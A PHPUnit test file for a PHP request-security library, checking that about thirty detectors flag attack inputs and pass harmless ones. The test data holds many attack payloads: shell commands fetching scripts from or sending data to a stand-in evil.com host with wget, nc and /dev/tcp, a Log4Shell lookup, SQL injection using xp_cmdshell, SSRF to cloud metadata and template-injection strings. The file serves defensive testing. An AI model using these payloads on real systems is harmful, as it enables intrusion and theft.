<?php

declare(strict_types=1);

/**
 * Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz
 */

namespace Erikwang2013\Security\Tests\Detector;

use Erikwang2013\Security\Detector\XssDetector;
use Erikwang2013\Security\Detector\SqlInjectionDetector;
use Erikwang2013\Security\Detector\CommandInjectionDetector;
use Erikwang2013\Security\Detector\PathTraversalDetector;
use Erikwang2013\Security\Detector\UploadDetector;
use Erikwang2013\Security\Detector\SsrfDetector;
use Erikwang2013\Security\Detector\XxeDetector;
use Erikwang2013\Security\Detector\HeaderInjectionDetector;
use Erikwang2013\Security\Detector\DeserializationDetector;
use Erikwang2013\Security\Detector\LdapInjectionDetector;
use Erikwang2013\Security\Detector\MailHeaderDetector;
use Erikwang2013\Security\Detector\SstiDetector;
use Erikwang2013\Security\Detector\NosqlInjectionDetector;
use Erikwang2013\Security\Detector\OpenRedirectDetector;
use Erikwang2013\Security\Detector\JwtAttackDetector;
use Erikwang2013\Security\Detector\HostHeaderDetector;
use Erikwang2013\Security\Detector\RequestSmugglingDetector;
use Erikwang2013\Security\Detector\GraphqlInjectionDetector;
use Erikwang2013\Security\Detector\XpathInjectionDetector;
use Erikwang2013\Security\Detector\JndiInjectionDetector;
use Erikwang2013\Security\Detector\SsiInjectionDetector;
use Erikwang2013\Security\Detector\CsvInjectionDetector;
use Erikwang2013\Security\Detector\DataLeakDetector;
use Erikwang2013\Security\Detector\PrototypePollutionDetector;
use Erikwang2013\Security\Detector\WebSocketDetector;
use Erikwang2013\Security\Detector\CorsDetector;
use Erikwang2013\Security\Detector\DnsRebindingDetector;
use Erikwang2013\Security\Detector\HttpMethodDetector;
use Erikwang2013\Security\Detector\BodySizeDetector;
use Erikwang2013\Security\Detector\ContentTypeDetector;
use Erikwang2013\Security\Detector\CsrfOriginDetector;
use Erikwang2013\Security\DetectorInterface;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class AllDetectorsTest extends TestCase
{
    #[DataProvider('providePositivePayloads')]
    public function testDetectorCatchesAttack(DetectorInterface $detector, string $field, string $payload): void
    {
        $result = $detector->detect([$field => $payload]);
        $this->assertNotEmpty($result, "{$detector->name()} should detect: {$payload}");
        $this->assertSame($detector->name(), $result[0]->type);
    }

    #[DataProvider('provideSafePayloads')]
    public function testDetectorDoesNotTriggerFalsePositive(DetectorInterface $detector, string $field, string $payload): void
    {
        $result = $detector->detect([$field => $payload]);
        $this->assertEmpty($result, "{$detector->name()} should NOT trigger on: {$payload}");
    }

    public function testAllDetectorsHaveValidName(): void
    {
        foreach ($this->allDetectors() as $detector) {
            $name = $detector->name();
            $this->assertIsString($name);
            $this->assertNotEmpty($name);
        }
    }

    public function testAllDetectorsReturnNullForEmptyArray(): void
    {
        foreach ($this->allDetectors() as $detector) {
            $this->assertEmpty($detector->detect([]), "{$detector->name()} should return empty array for empty input");
        }
    }

    public function testAllDetectorsSkipNonStringValues(): void
    {
        foreach ($this->allDetectors() as $detector) {
            $result = $detector->detect(['arr' => [1, 2, 3], 'num' => 42, 'bool' => true]);
            $this->assertEmpty($result, "{$detector->name()} should skip non-string values");
        }
    }

    public function testDetectorsReturnCorrectSeverityLevels(): void
    {
        $validSeverities = ['critical', 'high', 'medium', 'low'];
        foreach ($this->allDetectors() as $detector) {
            $result = $detector->detect($this->attackPayloadFor($detector->name()));
            if (!empty($result)) {
                $this->assertContains($result[0]->severity, $validSeverities,
                    "{$detector->name()}: severity '{$result[0]->severity}' should be one of: " . implode(', ', $validSeverities));
                $this->assertNotEmpty($result[0]->detail);
                $this->assertNotEmpty($result[0]->field);
                $this->assertNotEmpty($result[0]->payload);
            }
        }
    }

    // ──────────────── DATA PROVIDERS ────────────────

    public static function providePositivePayloads(): iterable
    {
        // XSS (6 vectors)
        yield 'XSS: script tag' => [new XssDetector(), 'x', '<script>alert(1)</script>'];
        yield 'XSS: iframe' => [new XssDetector(), 'x', '<iframe src="evil.html">'];
        yield 'XSS: onerror' => [new XssDetector(), 'x', '<img src=x onerror=alert(1)>'];
        yield 'XSS: javascript URI' => [new XssDetector(), 'x', 'javascript:alert(1)'];
        yield 'XSS: embed' => [new XssDetector(), 'x', '<embed src="evil.swf">'];
        yield 'XSS: expression' => [new XssDetector(), 'x', 'expression(alert(1))'];

        // SQL Injection (8 vectors)
        yield 'SQLi: union select' => [new SqlInjectionDetector(), 'x', '1 union select password from users'];
        yield 'SQLi: sleep()' => [new SqlInjectionDetector(), 'x', "1' AND sleep(5)--"];
        yield 'SQLi: benchmark()' => [new SqlInjectionDetector(), 'x', "1' AND benchmark(5000000,md5(1))--"];
        yield 'SQLi: or 1=1' => [new SqlInjectionDetector(), 'x', "' or 1=1 --"];
        yield 'SQLi: information_schema' => [new SqlInjectionDetector(), 'x', 'SELECT * FROM information_schema.tables'];
        yield 'SQLi: load_file' => [new SqlInjectionDetector(), 'x', "1' UNION SELECT load_file('/etc/passwd')"];
        yield 'SQLi: xp_cmdshell' => [new SqlInjectionDetector(), 'x', "1'; exec xp_cmdshell 'dir'--"];
        yield 'SQLi: waitfor' => [new SqlInjectionDetector(), 'x', "1'; waitfor delay '0:0:5'--"];
        yield 'SQLi: pg_sleep' => [new SqlInjectionDetector(), 'x', "1'; SELECT pg_sleep(5)--"];
        yield 'SQLi: compact or' => [new SqlInjectionDetector(), 'x', "1'or'1'='1"];
        yield 'SQLi: no-space or' => [new SqlInjectionDetector(), 'x', '1or1=1'];
        yield 'SQLi: obfuscated union' => [new SqlInjectionDetector(), 'x', 'un/**/ion sel/**/ect'];

        // Command Injection (6 vectors)
        yield 'CMDi: backtick' => [new CommandInjectionDetector(), 'x', '`id`'];
        yield 'CMDi: dollar-paren' => [new CommandInjectionDetector(), 'x', '$(cat /etc/passwd)'];
        yield 'CMDi: semicolon wget' => [new CommandInjectionDetector(), 'x', 'ping; wget http://evil.com/shell.sh'];
        yield 'CMDi: pipe nc' => [new CommandInjectionDetector(), 'x', 'echo test | nc evil.com 4444'];
        yield 'CMDi: dev tcp' => [new CommandInjectionDetector(), 'x', '/dev/tcp/evil.com/4444'];
        yield 'CMDi: system()' => [new CommandInjectionDetector(), 'x', 'system("cat /etc/passwd")'];

        // Path Traversal (6 vectors)
        yield 'Path: ../' => [new PathTraversalDetector(), 'x', '../../../etc/passwd'];
        yield 'Path: ..\\' => [new PathTraversalDetector(), 'x', '..\\..\\windows\\system32'];
        yield 'Path: etc/passwd' => [new PathTraversalDetector(), 'x', '/etc/passwd'];
        yield 'Path: php://filter' => [new PathTraversalDetector(), 'x', 'php://filter/convert.base64-encode/resource=config.php'];
        yield 'Path: php://input' => [new PathTraversalDetector(), 'x', 'php://input'];
        yield 'Path: null byte' => [new PathTraversalDetector(), 'x', "index.php\0.html"];

        // SSRF (5 vectors)
        yield 'SSRF: 127.0.0.1' => [new SsrfDetector(), 'x', 'http://127.0.0.1/admin'];
        yield 'SSRF: metadata' => [new SsrfDetector(), 'x', 'http://169.254.169.254/latest/meta-data/'];
        yield 'SSRF: 192.168' => [new SsrfDetector(), 'x', 'http://192.168.1.1/secret'];
        yield 'SSRF: 10.x' => [new SsrfDetector(), 'x', 'http://10.0.0.1/internal'];
        yield 'SSRF: gopher' => [new SsrfDetector(), 'x', 'gopher://127.0.0.1:6379/_*1'];
        yield 'SSRF: 127.1 short form' => [new SsrfDetector(), 'x', 'http://127.1/admin'];
        yield 'SSRF: decimal integer' => [new SsrfDetector(), 'x', 'http://2130706433/x'];
        yield 'SSRF: hex integer' => [new SsrfDetector(), 'x', 'http://0x7f000001/x'];
        yield 'SSRF: octal dotted' => [new SsrfDetector(), 'x', 'http://0177.0.0.1/admin'];
        yield 'SSRF: hex dotted' => [new SsrfDetector(), 'x', 'http://0x7f.0.0.1/admin'];
        yield 'SSRF: zero host' => [new SsrfDetector(), 'x', 'http://0'];
        yield 'SSRF: ipv6 hex mapped' => [new SsrfDetector(), 'x', 'http://[::ffff:7f00:1]/'];

        // XXE (3 vectors)
        yield 'XXE: ENTITY SYSTEM' => [new XxeDetector(), 'x', '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'];
        yield 'XXE: DOCTYPE SYSTEM' => [new XxeDetector(), 'x', '<!DOCTYPE foo SYSTEM "http://evil.dtd">'];
        yield 'XXE: param entity' => [new XxeDetector(), 'x', '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.dtd"> %xxe;]>'];

        // Header Injection (4 vectors)
        yield 'Header: %0d%0a' => [new HeaderInjectionDetector(), 'x', "/path%0d%0aSet-Cookie:%20hacked=true"];
        yield 'Header: CRLF raw' => [new HeaderInjectionDetector(), 'x', "foo\r\nSet-Cookie: hacked=true"];
        yield 'Header: double CRLF' => [new HeaderInjectionDetector(), 'x', "foo\r\n\r\nHTTP/1.1 200 OK"];
        yield 'Header: Location' => [new HeaderInjectionDetector(), 'x', "foo\r\nLocation: https://evil.com"];

        // Deserialization (4 vectors)
        yield 'Deser: O:digit' => [new DeserializationDetector(), 'x', 'O:8:"UserData":1:{s:4:"name";s:3:"bob";}'];
        yield 'Deser: C:digit' => [new DeserializationDetector(), 'x', 'C:10:"MyClass":0:{}'];
        yield 'Deser: a:digit' => [new DeserializationDetector(), 'x', 'a:2:{i:0;s:5:"hello";i:1;s:5:"world";}'];
        yield 'Deser: __wakeup' => [new DeserializationDetector(), 'x', '__wakeup is a magic method'];

        // LDAP (3 vectors)
        yield 'LDAP: OR filter' => [new LdapInjectionDetector(), 'x', '(|(uid=*)(uid=admin))'];
        yield 'LDAP: NOT wildcard' => [new LdapInjectionDetector(), 'x', '(!(uid=*))'];
        yield 'LDAP: AND filter' => [new LdapInjectionDetector(), 'x', '(&(uid=admin)(password=*))'];

        // Mail Header (3 vectors)
        yield 'Mail: Bcc inject' => [new MailHeaderDetector(), 'x', "test@x.com\r\nBcc: spam@evil.com"];
        yield 'Mail: Cc inject' => [new MailHeaderDetector(), 'x', "test@x.com\nCc: leak@evil.com"];
        yield 'Mail: From inject' => [new MailHeaderDetector(), 'x', "test@x.com\nFrom: fake@evil.com"];

        // SSTI (5 vectors)
        yield 'SSTI: Jinja2' => [new SstiDetector(), 'x', '{{7*7}}'];
        yield 'SSTI: FreeMarker' => [new SstiDetector(), 'x', '${7*7}'];
        yield 'SSTI: Flask config' => [new SstiDetector(), 'x', '{{config}}'];
        yield 'SSTI: MRO' => [new SstiDetector(), 'x', '{{().__class__.__bases__[0].__subclasses__()}}'];
        yield 'SSTI: Twig' => [new SstiDetector(), 'x', '{{_self.env.registerUndefinedFilterCallback("system")}}'];

        // NoSQL (4 vectors)
        yield 'NoSQL: $ne' => [new NosqlInjectionDetector(), 'x', '{"$ne": ""}'];
        yield 'NoSQL: $gt' => [new NosqlInjectionDetector(), 'x', '{"$gt": ""}'];
        yield 'NoSQL: $where' => [new NosqlInjectionDetector(), 'x', '{"$where": "this.field > 5"}'];
        yield 'NoSQL: $regex' => [new NosqlInjectionDetector(), 'x', '{"$regex": "^admin"}'];

        // Open Redirect (3 vectors)
        yield 'Redirect: //' => [new OpenRedirectDetector(), 'x', '//evil.com/phishing'];
        yield 'Redirect: javascript:' => [new OpenRedirectDetector(), 'x', 'javascript:alert(document.cookie)'];
        yield 'Redirect: data:' => [new OpenRedirectDetector(), 'x', 'data:text/html,<script>alert(1)</script>'];
        yield 'Redirect: backslash' => [new OpenRedirectDetector(), 'x', '\evil.com'];
        yield 'Redirect: encoded slashes' => [new OpenRedirectDetector(), 'x', '%2f%2fevil.com'];

        // JWT (3 vectors)
        yield 'JWT: alg none' => [new JwtAttackDetector(), 'x', 'eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.'];
        yield 'JWT: kid injection' => [new JwtAttackDetector(), 'x', 'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.sig'];
        yield 'JWT: empty sig' => [new JwtAttackDetector(), 'x', 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.'];

        // Host Header (3 vectors)
        yield 'Host: CRLF injection' => [new HostHeaderDetector(), 'x', "example.com\r\nHost: evil.com"];
        yield 'Host: X-Forwarded-Host' => [new HostHeaderDetector(), 'x', "foo\r\nX-Forwarded-Host: evil.com"];
        yield 'Host: X-Original-URL' => [new HostHeaderDetector(), 'x', "foo\r\nX-Original-URL: /admin"];

        // Request Smuggling (3 vectors)
        yield 'Smug: TE chunked' => [new RequestSmugglingDetector(), 'x', "Transfer-Encoding: chunked\r\nContent-Length: 0"];
        yield 'Smug: dual TE' => [new RequestSmugglingDetector(), 'x', "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"];
        yield 'Smug: injected TE' => [new RequestSmugglingDetector(), 'x', "foo\r\nTransfer-Encoding: chunked"];

        // GraphQL (3 vectors)
        yield 'GQL: __schema' => [new GraphqlInjectionDetector(), 'x', '{__schema{types{name}}}'];
        yield 'GQL: __schema spaced' => [new GraphqlInjectionDetector(), 'x', '{ __schema { types { name } } }'];
        yield 'GQL: __type' => [new GraphqlInjectionDetector(), 'x', '{__type(name:"User"){fields{name}}}'];
        yield 'GQL: deep nest' => [new GraphqlInjectionDetector(), 'x', '{a{b{c{d{e{f{g{h{id}}}}}}}}}'];

        // XPATH (3 vectors)
        yield 'XPATH: 1=1' => [new XpathInjectionDetector(), 'x', "' or '1'='1"];
        yield 'XPATH: union' => [new XpathInjectionDetector(), 'x', "'] | //user[admin='true'"];
        yield 'XPATH: count' => [new XpathInjectionDetector(), 'x', "'] | count(//user)"];

        // JNDI (4 vectors)
        yield 'JNDI: Log4Shell' => [new JndiInjectionDetector(), 'x', '${jndi:ldap://evil.com/a}'];
        yield 'JNDI: lower obfus' => [new JndiInjectionDetector(), 'x', '${lower:j}ndi:ldap://evil.com/a'];
        yield 'JNDI: env' => [new JndiInjectionDetector(), 'x', '${env:AWS_SECRET_ACCESS_KEY}'];
        yield 'JNDI: empty obfus' => [new JndiInjectionDetector(), 'x', '${::-j}${::-n}${::-d}${::-i}'];

        // SSI (3 vectors)
        yield 'SSI: exec cmd' => [new SsiInjectionDetector(), 'x', '<!--#exec cmd="id"-->'];
        yield 'SSI: include file' => [new SsiInjectionDetector(), 'x', '<!--#include file="/etc/passwd"-->'];
        yield 'SSI: echo var' => [new SsiInjectionDetector(), 'x', '<!--#echo var="DOCUMENT_ROOT"-->'];

        // CSV Injection (3 vectors)
        yield 'CSV: cmd pipe' => [new CsvInjectionDetector(), 'x', '=cmd|/c calc.exe!A0'];
        yield 'CSV: powershell' => [new CsvInjectionDetector(), 'x', '=powershell -c wget evil.com/s'];
        yield 'CSV: HYPERLINK' => [new CsvInjectionDetector(), 'x', '=HYPERLINK("http://evil.com","click")'];

        // Data Leak (4 vectors)
        yield 'Leak: AWS key' => [new DataLeakDetector(), 'x', 'AKIAIOSFODNN7EXAMPLE'];
        yield 'Leak: card' => [new DataLeakDetector(), 'x', '4111-1111-1111-1111'];
        yield 'Leak: db url' => [new DataLeakDetector(), 'x', 'mysql://admin:hunter2@db.internal/prod'];
        yield 'Leak: private key' => [new DataLeakDetector(), 'x', '-----BEGIN RSA PRIVATE KEY-----'];

        // Prototype Pollution (3 vectors)
        yield 'Proto: __proto__' => [new PrototypePollutionDetector(), 'x', 'obj.__proto__.isAdmin=true'];
        yield 'Proto: constructor.prototype' => [new PrototypePollutionDetector(), 'x', 'constructor.prototype.isAdmin=true'];
        yield 'Proto: defineGetter' => [new PrototypePollutionDetector(), 'x', 'obj.__defineGetter__("x",fn)'];

        // WebSocket (2 vectors)
        yield 'WS: upgrade' => [new WebSocketDetector(), 'x', "foo\r\nUpgrade: websocket\r\nConnection: Upgrade"];
        yield 'WS: null origin' => [new WebSocketDetector(), 'x', "foo\r\nOrigin: null\r\n"];

        // CORS (2 vectors)
        yield 'CORS: ACAO' => [new CorsDetector(), 'x', "foo\r\nAccess-Control-Allow-Origin: *"];
        yield 'CORS: ACAC' => [new CorsDetector(), 'x', "foo\r\nAccess-Control-Allow-Credentials: true"];

        // DNS Rebinding (3 vectors)
        yield 'DNS: Host 127' => [new DnsRebindingDetector(), 'x', "foo\r\nHost: 127.0.0.1"];
        yield 'DNS: Host 192.168' => [new DnsRebindingDetector(), 'x', "foo\r\nHost: 192.168.1.1"];
        yield 'DNS: Host localhost' => [new DnsRebindingDetector(), 'x', "foo\r\nHost: localhost"];

        // DNS Rebinding — raw _server.HTTP_HOST values
        yield 'DNS: HTTP_HOST raw 127' => [new DnsRebindingDetector(), '_server.HTTP_HOST', '127.0.0.1'];
        yield 'DNS: HTTP_HOST raw 10' => [new DnsRebindingDetector(), '_server.HTTP_HOST', '10.0.0.1'];
        yield 'DNS: HTTP_HOST raw localhost' => [new DnsRebindingDetector(), '_server.HTTP_HOST', 'localhost'];
        yield 'DNS: HTTP_HOST raw v6' => [new DnsRebindingDetector(), '_server.HTTP_HOST', '[::1]'];
    }

    public static function provideSafePayloads(): iterable
    {
        yield 'Safe: normal name' => [new XssDetector(), 'name', 'John Doe'];
        yield 'Safe: email' => [new XssDetector(), 'email', 'john.doe@example.com'];
        yield 'Safe: phone' => [new XssDetector(), 'phone', '+1-555-123-4567'];
        yield 'Safe: address' => [new SqlInjectionDetector(), 'addr', '123 Main Street, Apt 4B'];
        yield 'Safe: description' => [new CommandInjectionDetector(), 'desc', 'The quick brown fox jumps over the lazy dog'];
        yield 'Safe: number' => [new PathTraversalDetector(), 'id', '42'];
        yield 'Safe: uuid' => [new SsrfDetector(), 'uuid', '550e8400-e29b-41d4-a716-446655440000'];
        yield 'Safe: ip-like number in path' => [new SsrfDetector(), 'url', 'http://example.com/2130706433'];
        yield 'Safe: __typename field' => [new GraphqlInjectionDetector(), 'q', 'query { user { __typename } }'];
        yield 'Safe: normal graphql query' => [new GraphqlInjectionDetector(), 'q', 'query Me { me { posts { title } } }'];
        yield 'Safe: bare TE header' => [new HeaderInjectionDetector(), 'x', 'Transfer-Encoding: chunked'];
        yield 'Safe: bare CL header' => [new HeaderInjectionDetector(), 'x', 'Content-Length: 0'];
        yield 'Safe: range 5--10' => [new SqlInjectionDetector(), 'x', '5--10'];
        yield 'Safe: range 2023--2024' => [new SqlInjectionDetector(), 'x', '2023--2024'];
        yield 'Safe: /etc/hosts text' => [new PathTraversalDetector(), 'x', '/etc/hosts'];
        yield 'Safe: javascript prose' => [new OpenRedirectDetector(), 'x', 'JavaScript: The Good Parts'];
        yield 'Safe: template variable' => [new SstiDetector(), 'x', '${user.name}'];
        yield 'Safe: ldap scheme url' => [new JndiInjectionDetector(), 'x', 'ldap://dc.example.com/'];
        yield 'Safe: sleep call' => [new SqlInjectionDetector(), 'x', 'sleep(5);'];
        yield 'Safe: sleep call nosql' => [new NosqlInjectionDetector(), 'x', 'sleep(5);'];
        yield 'Safe: important css' => [new LdapInjectionDetector(), 'x', '(!important)'];
        yield 'Safe: uid number' => [new LdapInjectionDetector(), 'x', '(uid=1000)'];
        yield 'Safe: order number' => [new DataLeakDetector(), 'x', '4000-1234-5678-9012'];
        yield 'Safe: short password' => [new DataLeakDetector(), 'x', 'password=123456'];
        yield 'Safe: toString assignment' => [new PrototypePollutionDetector(), 'x', 'obj.toString='];
        yield 'Safe: __toString prose' => [new DeserializationDetector(), 'x', '__toString'];
        yield 'Safe: simple sum' => [new CsvInjectionDetector(), 'x', '12+34'];
        yield 'Safe: base64 allowed' => [new DataLeakDetector(), 'token', 'dGhpc2lzYXRva2Vu']; // "thisisatoken" in base64
        yield 'Safe: regular json' => [new SstiDetector(), 'data', '{"name": "John", "age": 30}'];
        yield 'Safe: simple url' => [new OpenRedirectDetector(), 'url', '/dashboard'];
        yield 'Safe: relative path' => [new PathTraversalDetector(), 'path', 'images/photo.jpg'];
        yield 'Safe: online=true' => [new XssDetector(), 'x', 'status=online=true'];
        yield 'Safe: double pipe' => [new CommandInjectionDetector(), 'x', 'left || right'];
        yield 'Safe: substring js' => [new XpathInjectionDetector(), 'x', 'str.substring(0,3)'];
        yield 'Safe: __construct word' => [new DeserializationDetector(), 'x', '__construct is a magic method'];
        yield 'Safe: comment word' => [new SqlInjectionDetector(), 'x', 'comment --'];
        yield 'Safe: note hash' => [new SqlInjectionDetector(), 'x', 'note #'];
        yield 'Safe: legal xml with xsi' => [
            new XxeDetector(),
            'x',
            '<?xml version="1.0"?><root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><item>1</item></root>',
        ];
        yield 'Safe: dns host example.com' => [new DnsRebindingDetector(), '_server.HTTP_HOST', 'example.com'];
    }

    // ──────────────── HELPERS ────────────────

    private function allDetectors(): array
    {
        return [
            new XssDetector(),
            new SqlInjectionDetector(),
            new CommandInjectionDetector(),
            new PathTraversalDetector(),
            new UploadDetector(),
            new SsrfDetector(),
            new XxeDetector(),
            new HeaderInjectionDetector(),
            new DeserializationDetector(),
            new LdapInjectionDetector(),
            new MailHeaderDetector(),
            new SstiDetector(),
            new NosqlInjectionDetector(),
            new OpenRedirectDetector(),
            new JwtAttackDetector(),
            new HostHeaderDetector(),
            new RequestSmugglingDetector(),
            new GraphqlInjectionDetector(),
            new XpathInjectionDetector(),
            new JndiInjectionDetector(),
            new SsiInjectionDetector(),
            new CsvInjectionDetector(),
            new DataLeakDetector(),
            new PrototypePollutionDetector(),
            new WebSocketDetector(),
            new CorsDetector(),
            new DnsRebindingDetector(),
            new HttpMethodDetector(),
            new BodySizeDetector(),
            new ContentTypeDetector(),
            new CsrfOriginDetector(),
        ];
    }

    private function attackPayloadFor(string $name): array
    {
        $payloads = [
            'xss' => ['x' => '<script>alert(1)</script>'],
            'sql_injection' => ['x' => "1' union select password from users--"],
            'command_injection' => ['x' => 'ping; wget http://evil.com/shell.sh'],
            'path_traversal' => ['x' => '../../../etc/passwd'],
            'upload' => ['x' => ['name' => 'shell.php', 'tmp_name' => '/tmp/phpXXXX']],
            'ssrf' => ['x' => 'http://127.0.0.1/admin'],
            'xxe' => ['x' => '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
            'header_injection' => ['x' => "foo\r\nSet-Cookie: hacked=true"],
            'deserialization' => ['x' => 'O:8:"UserData":1:{s:4:"name";s:3:"bob";}'],
            'ldap_injection' => ['x' => '(|(uid=*)(uid=admin))'],
            'mail_header' => ['x' => "test@x.com\r\nBcc: spam@evil.com"],
            'ssti' => ['x' => '{{7*7}}'],
            'nosql_injection' => ['x' => '{"$ne": ""}'],
            'open_redirect' => ['x' => '//evil.com'],
            'jwt_attack' => ['x' => 'eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.'],
            'host_header' => ['x' => "foo\r\nHost: evil.com"],
            'request_smuggling' => ['x' => "Transfer-Encoding: chunked\r\nContent-Length: 0"],
            'graphql_injection' => ['x' => '{__schema{types{name}}}'],
            'xpath_injection' => ['x' => "' or '1'='1"],
            'jndi_injection' => ['x' => '${jndi:ldap://evil.com/a}'],
            'ssi_injection' => ['x' => '<!--#exec cmd="id"-->'],
            'csv_injection' => ['x' => '=cmd|/c calc.exe'],
            'data_leak' => ['x' => 'AKIAIOSFODNN7EXAMPLE'],
            'prototype_pollution' => ['x' => '__proto__.isAdmin=true'],
            'websocket' => ['x' => "foo\r\nUpgrade: websocket"],
            'cors' => ['x' => "foo\r\nAccess-Control-Allow-Origin: *"],
            'dns_rebinding' => ['x' => "foo\r\nHost: 127.0.0.1"],
            'http_method' => ['x' => 'test'],
            'body_size' => ['x' => 'test'],
            'content_type' => ['x' => 'test'],
            'csrf_origin' => ['x' => 'test'],
        ];
        return $payloads[$name] ?? ['x' => 'test'];
    }

    // ──────────────── HTTP METHOD DETECTOR ────────────────

    public function testHttpMethodDetectorBlocksUnknownMethod(): void
    {
        $detector = new HttpMethodDetector();
        $result = $detector->detect(['_server.REQUEST_METHOD' => 'TRACE']);
        $this->assertNotEmpty($result);
        $this->assertSame('http_method', $result[0]->type);
        $this->assertSame(405, $result[0]->httpStatus);
    }

    public function testHttpMethodDetectorAllowsKnownMethod(): void
    {
        $detector = new HttpMethodDetector();
        $result = $detector->detect(['_server.REQUEST_METHOD' => 'POST']);
        $this->assertEmpty($result);
    }

    public function testHttpMethodDetectorNullWhenNoServerVar(): void
    {
        $detector = new HttpMethodDetector();
        $result = $detector->detect([]);
        $this->assertEmpty($result);
    }

    // ──────────────── BODY SIZE DETECTOR ────────────────

    public function testBodySizeDetectorBlocksLargeBody(): void
    {
        $detector = new BodySizeDetector();
        $result = $detector->detect(['_server.CONTENT_LENGTH' => '20971520']);
        $this->assertNotEmpty($result);
        $this->assertSame('body_size', $result[0]->type);
        $this->assertSame(413, $result[0]->httpStatus);
    }

    public function testBodySizeDetectorAllowsNormalBody(): void
    {
        $detector = new BodySizeDetector();
        $result = $detector->detect(['_server.CONTENT_LENGTH' => '1024']);
        $this->assertEmpty($result);
    }

    public function testBodySizeDetectorNullWhenNoServerVar(): void
    {
        $detector = new BodySizeDetector();
        $result = $detector->detect([]);
        $this->assertEmpty($result);
    }

    // ──────────────── CONTENT TYPE DETECTOR ────────────────

    public function testContentTypeDetectorBlocksUnknownType(): void
    {
        $detector = new ContentTypeDetector();
        $result = $detector->detect(['_server.CONTENT_TYPE' => 'application/octet-stream']);
        $this->assertNotEmpty($result);
        $this->assertSame('content_type', $result[0]->type);
        $this->assertSame(415, $result[0]->httpStatus);
    }

    public function testContentTypeDetectorAllowsKnownType(): void
    {
        $detector = new ContentTypeDetector();
        $result = $detector->detect(['_server.CONTENT_TYPE' => 'application/json; charset=utf-8']);
        $this->assertEmpty($result);
    }

    public function testContentTypeDetectorNullWhenNoServerVar(): void
    {
        $detector = new ContentTypeDetector();
        $result = $detector->detect([]);
        $this->assertEmpty($result);
    }

    // ──────────────── CSRF ORIGIN DETECTOR ────────────────

    public function testCsrfOriginDetectorBlocksMismatchedOrigin(): void
    {
        $detector = new CsrfOriginDetector();
        $result = $detector->detect(['_server.HTTP_ORIGIN' => 'https://evil.com', '_server.HTTP_HOST' => 'good.com']);
        $this->assertNotEmpty($result);
        $this->assertSame('csrf_origin', $result[0]->type);
        $this->assertSame(403, $result[0]->httpStatus);
    }

    public function testCsrfOriginDetectorAllowsMatchingOrigin(): void
    {
        $detector = new CsrfOriginDetector();
        $result = $detector->detect(['_server.HTTP_ORIGIN' => 'https://mysite.com', '_server.HTTP_HOST' => 'mysite.com']);
        $this->assertEmpty($result);
    }

    public function testCsrfOriginDetectorNullWhenNoServerVar(): void
    {
        $detector = new CsrfOriginDetector();
        $result = $detector->detect([]);
        $this->assertEmpty($result);
    }

    public function testCsrfOriginDetectorAllowsSameOriginWithPort(): void
    {
        $detector = new CsrfOriginDetector();
        $result = $detector->detect([
            '_server.HTTP_ORIGIN' => 'https://mysite.com:8080',
            '_server.HTTP_HOST' => 'mysite.com:8080',
        ]);
        $this->assertEmpty($result, 'Same origin with non-default port should NOT be flagged');
    }
}
